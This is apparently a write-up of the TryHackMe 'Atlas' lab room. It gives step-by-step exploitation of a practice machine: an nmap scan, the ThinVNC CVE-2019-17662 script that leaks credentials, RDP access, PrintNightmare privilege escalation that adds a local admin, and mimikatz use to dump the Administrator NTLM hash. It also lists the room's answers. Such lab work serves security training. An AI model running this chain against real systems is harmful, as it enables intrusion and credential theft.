# Atlas Walkthrough
### Link
- https://tryhackme.com/room/atlas
---
# Task 1: Introduction

Read the room disclaimer et start the targeted machine

# Task 2: Enumeration - Port Scanning

- Scan your target IP (MACHINE_IP) with Nmap
```
nmap -vv -Pn [IP]
```
```
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2022-11-21 14:36 JST
Initiating Parallel DNS resolution of 1 host. at 14:36
Completed Parallel DNS resolution of 1 host. at 14:36, 0.12s elapsed
Initiating Connect Scan at 14:36
Scanning 10.10.134.226 [1000 ports]
Discovered open port 8080/tcp on 10.10.134.226
Discovered open port 3389/tcp on 10.10.134.226
Connect Scan Timing: About 9.40% done; ETC: 14:42 (0:04:59 remaining)
Connect Scan Timing: About 25.95% done; ETC: 14:40 (0:02:54 remaining)
Connect Scan Timing: About 40.00% done; ETC: 14:40 (0:02:17 remaining)
Connect Scan Timing: About 44.10% done; ETC: 14:41 (0:02:33 remaining)
Connect Scan Timing: About 60.55% done; ETC: 14:42 (0:02:16 remaining)
Increasing send delay for 10.10.134.226 from 0 to 5 due to 26 out of 86 dropped probes since last increase.
Stats: 0:04:20 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 68.65% done; ETC: 14:43 (0:01:59 remaining)
Increasing send delay for 10.10.134.226 from 5 to 10 due to 11 out of 17 dropped probes since last increase.
Connect Scan Timing: About 75.15% done; ETC: 14:43 (0:01:38 remaining)
Connect Scan Timing: About 81.05% done; ETC: 14:43 (0:01:17 remaining)
Increasing send delay for 10.10.134.226 from 10 to 20 due to 11 out of 20 dropped probes since last increase.
Connect Scan Timing: About 91.55% done; ETC: 14:43 (0:00:33 remaining)
Completed Connect Scan at 14:43, 385.15s elapsed (1000 total ports)
Nmap scan report for 10.10.134.226
Host is up, received user-set (0.39s latency).
Scanned at 2022-11-21 14:36:58 JST for 385s
Not shown: 998 filtered ports
Reason: 998 no-responses
PORT     STATE SERVICE       REASON
3389/tcp open  ms-wbt-server syn-ack
8080/tcp open  http-proxy    syn-ack

Read data files from: /usr/local/bin/../share/nmap
```
- With the Nmap default port range, you should find that two ports are open. What port numbers are these?

### Answer: **3389,8080**

- What service does Nmap think is running on the higher of the two ports?

### Answer: **http-proxy**

- We would usually go on to do a lot more in-depth scanning, but we will leave it at that for this introductory room. We have what we need for the time being.

Nothing to do

# Task 3: Enumeration - Service Enumeration

- Use searchsploit to find the vulnerability in ThinVNC

As indicated in this task, I launched **curl**

```
curl 10.10.134.226:8080 -v
*   Trying 10.10.134.226:8080...
* Connected to 10.10.134.226 (10.10.134.226) port 8080 (#0)
> GET / HTTP/1.1
> Host: 10.10.134.226:8080
> User-Agent: curl/7.84.0
> Accept: */*
>
* Mark bundle as not supporting multiuse
< HTTP/1.1 401 Access Denied
< Content-Type: text/html
< Content-Length: 144
< Connection: Keep-Alive
< WWW-Authenticate: Digest realm="ThinVNC", qop="auth", nonce="887Jusfq5UDI16kAx+rlQA==", opaque="ZMYwZNxD6jZO0vZUPYWx0b8sHmnUZops5M"
<
<HTML><HEAD><TITLE>401 Access Denied</TITLE></HEAD><BODY><H1>401 Access Denied</H1>The requested URL  requires authorization.<P></BODY></HTML>
* Connection #0 to host 10.10.134.226 left intact
```

The suggesiton for this task is to use **searchsploit** but I really prefer to directly check [exploitdb](https://www.exploit-db.com/)

We hae an exploit here [Link](https://www.exploit-db.com/exploits/47519)

# Task 4: Attack - Foothold

- Download the python file from the link provided in the task [CVE-2019-17662](https://github.com/MuirlandOracle/CVE-2019-17662)
- Set the file executable 
```
chmod +x CVE-2019-17662.py
```
- This script requires 2 arguments : Host and Port. Let's try it withi these 2 arguments
```
┌──(kali㉿kali)-[/media/sf_LOLO_Share]
└─$ ./CVE-2019-17662.py 10.10.134.226 8080

     _____ _     _    __     ___   _  ____                                   
    |_   _| |__ (_)_ _\ \   / / \ | |/ ___|                                  
      | | | '_ \| | '_ \ \ / /|  \| | |                                      
      | | | | | | | | | \ V / | |\  | |___                                   
      |_| |_| |_|_|_| |_|\_/  |_| \_|\____|                                  
                                                                             
                            @MuirlandOracle                                  

                
[+] Credentials Found!
Username:       Atlas
Password:       H0ldUpTheHe@vens
```

- Use the credentials found by the script to get past the HTTP Basic Auth presented when trying to access the vulnerable service in your web browser. You should have access to a user desktop!

And from this web browser interface, we can connect remotely to the targeted machine ^^

# Task 5: Access - VNC/RDP

- Connect with **xfreerdp**
```
xfreerdp /v:10.10.134.226 /u:Atlas /p:H0ldUpTheHe@vens /cert:ignore +clipboard /dynamic-resolution /drive:share,/tmp
```
# Task 6: Attack - Privilege escalation

- Download the script to the targeted machine

```
PS C:\Users\Atlas> . \\tsclient\share\CVE-2021-1675.ps1

Security warning
Run only scripts that you trust. While scripts from the internet can be useful, this script can potentially harm your
computer. If you trust this script, use the Unblock-File cmdlet to allow the script to run without this warning
message. Do you want to run \\tsclient\share\CVE-2021-1675.ps1?
[D] Do not run  [R] Run once  [S] Suspend  [?] Help (default is "D"): R
```

- Run the exploit
```
PS C:\Users\Atlas> Invoke-Nightmare
[+] using default new user: adm1n
[+] using default new password: P@ssw0rd
[+] created payload at C:\Users\Atlas\AppData\Local\Temp\1\nightmare.dll
[+] using pDriverPath = "C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_18b0d38ddfaee729\Amd64\mxdwdrv.dll"
[+] added user  as local administrator
[+] deleting payload from C:\Users\Atlas\AppData\Local\Temp\1\nightmare.dll
PS C:\Users\Atlas>
```

- Now , we can launch a new Pwershell as Administrator ^^
# Task 7: Attack : Post exploitation

- Download [mimikatz](https://github.com/gentilkiwi/mimikatz/releases) and use it in the targeted machine
- Use the command
```
privilege::debug -- this obtains debug privileges which (without going into too much depth in the Windows privilege structure) allows us to access other processes for "debugging" purposes.
token::elevate -- simply put, this takes us from our administrative shell with high privileges into a SYSTEM level shell with maximum privileges. This is something that we have a right to do as an administrator, but that is not usually possible using normal Windows operations.
```

```
PS C:\Windows\system32> \\tsclient\share\x64\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # token::elevate
Token Id  : 0
User name :
SID name  : NT AUTHORITY\SYSTEM

668     {0;000003e7} 1 D 24742          NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Primary
 -> Impersonated !
 * Process Token : {0;00263a20} 1 F 2668993     GAIA\adm1n      S-1-5-21-1966530601-3185510712-10604624-1009    (13g,24p)       Primary
 * Thread Token  : {0;000003e7} 1 D 2714625     NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Impersonation (Delegation)
```

# Question : What is the Administrator account's NTLM password hash?
```

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: c16444961f67af7eea7e420b65c8c3eb
```
# Answer : c16444961f67af7eea7e420b65c8c3eb
# Task 8: Conclusion - Final Thoughts

Read the conclusion ^^